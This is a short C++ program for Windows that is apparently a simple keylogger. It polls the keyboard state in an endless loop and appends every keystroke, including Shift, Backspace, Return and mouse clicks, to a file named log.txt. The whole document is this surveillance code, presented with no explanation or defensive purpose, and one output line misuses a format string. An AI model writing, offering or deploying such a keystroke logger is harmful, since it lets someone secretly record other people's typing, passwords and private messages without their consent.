#include<iostream>
#include<Windows.h>
#include<cstdio>
using namespace std;
int Save(int key, char *file)
{
    cout << key << endl;
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    if(key==VK_SHIFT)
        fprintf(OUTPUT_FILE,"%s","[SHIFT]");
    else if(key==VK_BACK)
        fprintf(OUTPUT_FILE,"%s","[BACK]");
    else if(key==VK_LBUTTON)
        fprintf(OUTPUT_FILE,"%s","[LBUTTON]");
    else if(key==VK_RETURN)
        fprintf(OUTPUT_FILE,"%s","[RETURN]");
    else if(key==VK_ESCAPE)
        fprintf(OUTPUT_FILE,"%s","[ESCAPE]");
    else
        fprintf(OUTPUT_FILE, "%s", &key);
    fclose(OUTPUT_FILE);
    return 0;
}
int main()
{
    int i;
    while (true)
    {
        for (int i = 8; i < 256; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                Save(i, "log.txt");
            }
        }
    }
    return 0;
}
